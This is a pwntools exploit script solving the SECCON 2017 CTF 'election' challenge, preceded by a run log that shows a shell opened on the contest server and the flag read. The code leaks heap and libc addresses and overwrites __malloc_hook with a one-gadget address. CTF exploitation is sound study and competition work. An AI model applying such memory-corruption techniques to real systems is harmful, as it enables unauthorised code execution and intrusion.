'''
root@6c7f37ea6051:/shared/seccon/2017/election-9724a8d0a6c9ccb131200ec96752c61c0e6734cd9e1bb7b1958f8c88c0bd78fa# python solve.py 1
[!] Couldn't find relocations against PLT to get symbols
[*] '/shared/seccon/2017/election-9724a8d0a6c9ccb131200ec96752c61c0e6734cd9e1bb7b1958f8c88c0bd78fa/election'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[!] Couldn't find relocations against PLT to get symbols
[*] '/shared/seccon/2017/election-9724a8d0a6c9ccb131200ec96752c61c0e6734cd9e1bb7b1958f8c88c0bd78fa/libc-2.23.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to election.pwn.seccon.jp on port 28349: Done
[*] heap_base : 0x14e6000
[*] libc_base : 0x7f451e148000
[*] one gadget : 0x7f451e238274
[*] Switching to interactive mode
done.

1. stand
2. vote
3. result
0. eat chocolate
>>
Enter the name.
>> $ k
$ ls
election
flag.txt
$ cat flag.txt
SECCON{I5_7h15_4_fr4ud_3l3c710n?}
'''

from pwn import *
import sys, time

context.binary = "./election"
binary = ELF("./election")
libc = ELF("./libc-2.23.so")

if len(sys.argv) == 1:
    p = process(["./election"], env={"LD_PRELOAD" : "./libc-2.23.so"})

else:
    p = remote("election.pwn.seccon.jp", "28349")

def stand(name):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil(">> ")
    p.sendline(name)


def vote(name):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("(Y/n) ")
    p.sendline("n")
    p.recvuntil(">> ")
    p.sendline(name)

def view():
    p.recvuntil(">> ")
    p.sendline("3")

candidate_list = 0x0000000000602028
atoi = 0x601fe8
printf = 0x601fb0
__malloc_hook = 0x3c4b10

stand(p64(atoi))

for i in xrange(0x20):
    vote("oshima")
    p.recvuntil(">> ")
#p.send("yes" + "\x00" * 5 + "a" * 0x18 + p64(candidate_list - 0x10) + "\x20" * 4)
    p.sendline("yes" + "\x00" * 5 + "A" * 0x17)
#    time.sleep(0.1)

##### LEAK #####
p.recvuntil(">> ")
p.sendline("2")
p.recvuntil("(Y/n) ")
p.sendline("Y")
p.recvuntil("* p")
heap_base = u64(("p" + p.recv(3)).ljust(8, "\x00")) - 0x70
log.info("heap_base : " + hex(heap_base))
p.recvuntil(">> ")
p.sendline("oshima")
p.recvuntil(">> ")
p.sendline("yes" + "\x00" * 5 + "a" * 0x18 + p64(heap_base + 0x48) + "\x70" * 4)

vote("oshima")
p.recvuntil(">> ")
p.sendline("yes" + "\x00" * 5 + "a" * 0x18 + p64(heap_base + 0x48) + "\x70" * 4)
p.recvuntil(">> ")
p.sendline("2")
p.recvuntil("(Y/n) ")
p.sendline("Y")
p.recvuntil("* Shinonome\n* ")
libc_base = u64(p.recv(6).ljust(8, "\x00")) - 0x36e80
log.info("libc_base : " + hex(libc_base))
p.sendline("A")
##### LEAK DONE #####
#magic = libc_base + 0x45216
magic = libc_base + 0xf0274
log.info("one gadget : " + hex(magic))
exp = "yes" + "\x00" * 5 + "a" * 0x18
'''
vote("oshima")
p.recvuntil(">> ")
p.sendline(exp + p64(libc_base + __malloc_hook - 0x10) + "\x80")
'''
def exploit(exploit_code):
    vote("oshima")
    p.recvuntil(">> ")
    p.sendline(exploit_code)

for i in xrange(6):
    one = (magic >> (8 * i)) & 0xff
    if one >= 0x80:
        for j in xrange(2):
            if one % 2 == 1:
                payload = exp + p64(libc_base + __malloc_hook - 0x10 + i) + (hex(one/2 + j))[2:].decode("hex")
            else:
                payload = exp + p64(libc_base + __malloc_hook - 0x10 + i) + (hex(one/2))[2:].decode("hex")
            exploit(payload)

    else:
        payload = exp + p64(libc_base + __malloc_hook - 0x10 + i) + (hex(one))[2:].decode("hex")
        exploit(payload)

vote("oshima")
p.recvuntil(">> ")
p.sendline(exp + p64(0x0000000000602010 - 0x10) + "\xfe")

p.sendline("1")
#p.sendline("ABCD")

p.interactive()
